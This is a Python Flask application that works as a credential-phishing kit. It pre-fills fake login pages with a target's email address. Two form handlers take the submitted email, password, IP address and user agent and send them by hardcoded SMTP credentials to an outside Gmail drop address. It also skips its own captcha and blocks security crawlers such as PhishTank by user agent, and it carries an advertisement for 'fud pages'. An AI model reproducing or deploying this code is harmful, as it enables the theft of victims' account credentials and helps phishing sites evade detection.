from flask import Flask, request, render_template, session, redirect, url_for
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

secret_keyx = "your_secret_key"  # Replace with your secret key
app.secret_key = secret_keyx

bot_user_agents = [
    'Googlebot', 'Baiduspider', 'ia_archiver', 'R6_FeedFetcher', 'NetcraftSurveyAgent', 'Sogou web spider',
    'bingbot', 'Yahoo! Slurp', 'facebookexternalhit', 'PrintfulBot', 'msnbot', 'Twitterbot', 'UnwindFetchor',
    'urlresolver', 'Butterfly', 'TweetmemeBot', 'PaperLiBot', 'MJ12bot', 'AhrefsBot', 'Exabot', 'Ezooms',
    'YandexBot', 'SearchmetricsBot', 'phishtank', 'PhishTank', 'picsearch', 'TweetedTimes Bot', 'QuerySeekerSpider',
    'ShowyouBot', 'woriobot', 'merlinkbot', 'BazQuxBot', 'Kraken', 'SISTRIX Crawler', 'R6_CommentReader',
    'magpie-crawler', 'GrapeshotCrawler', 'PercolateCrawler', 'MaxPointCrawler', 'R6_FeedFetcher', 'NetSeer crawler',
    'grokkit-crawler', 'SMXCrawler', 'PulseCrawler', 'Y!J-BRW', '80legs.com/webcrawler', 'Mediapartners-Google',
    'Spinn3r', 'InAGist', 'Python-urllib', 'NING', 'TencentTraveler', 'Feedfetcher-Google', 'mon.itor.us', 'spbot',
    'Feedly', 'bot', 'curl', "spider", "crawler"
]

@app.route('/', methods=['GET', 'POST'])
def captcha():
    if request.method == 'GET':
        # Set 'passed_captcha' to True without any user input check
        session['passed_captcha'] = True
        return redirect(url_for('success'))

    elif request.method != 'GET':
        # Remove the entire code validation logic
        # Set 'passed_captcha' to True
        session['passed_captcha'] = True
        return redirect(url_for('success'))

@app.route('/success')
def success():
    if 'passed_captcha' in session and session['passed_captcha']:
        web_param = request.args.get('web')
        return redirect(url_for('route2', web=web_param))
    else:
        return redirect(url_for('captcha'))

@app.route("/route2")
def route2():
    web_param = request.args.get('web')
    if web_param:
        session['eman'] = web_param
        session['ins'] = web_param[web_param.index('@') + 1:]
    return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))

@app.route("/first", methods=['POST'])
def first():
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For') or request.headers.get('X-Real-IP') or request.headers.get('X-Client-IP') or request.remote_addr
        email = request.form.get("horse")
        passwordemail = request.form.get("pig")
        sender_email = "onoshijohn@erhawthone.com"
        receiver_email = "onoshijohn@gmail.com"
        password = "1RQoQkJC[l)l"
        useragent = request.headers.get('User-Agent')
        message = MIMEMultipart("alternative")
        message["Subject"] = "KOREA UPDATE ! 1"
        message["From"] = sender_email
        message["To"] = receiver_email
        text = """\
        Hi,
        How are you?
        contact me on icq jamescartwright for your fud pages
        """
        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)
        with smtplib.SMTP_SSL("mail.erhawthone.com", 465) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
        return redirect(url_for('benza', web=session.get('eman')))

@app.route("/second", methods=['POST'])
def second():
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For') or request.headers.get('X-Real-IP') or request.headers.get('X-Client-IP') or request.remote_addr
        email = request.form.get("horse")
        passwordemail = request.form.get("pig")
        sender_email = "onoshijohn@erhawthone.com"
        receiver_email = "onoshijohn@gmail.com"
        password = "1RQoQkJC[l)l"
        useragent = request.headers.get('User-Agent')
        message = MIMEMultipart("alternative")
        message["Subject"] = "KOREA UPDATE !! 2"
        message["From"] = sender_email
        message["To"] = receiver_email
        text = """\
        Hi,
        How are you?
        contact me on icq jamescartwright for your fud pages
        """
        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)
        with smtplib.SMTP_SSL("mail.erhawthone.com", 465) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
        return redirect(url_for('lasmo'))

@app.route("/benzap", methods=['GET'])
def benza():
    if request.method == 'GET':
        eman = session.get('eman')
        dman = session.get('ins')
    return render_template('ind.html', eman=eman, dman=dman)

@app.route("/lasmop", methods=['GET'])
def lasmo():
    userip = request.headers.get("X-Forwarded-For")
    useragent = request.headers.get("User-Agent")
    
    if useragent in bot_user_agents:
        abort(403)  # forbidden
    
    if request.method == 'GET':
        dman = session.get('ins')
    return render_template('main.html', dman=dman)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=3000)
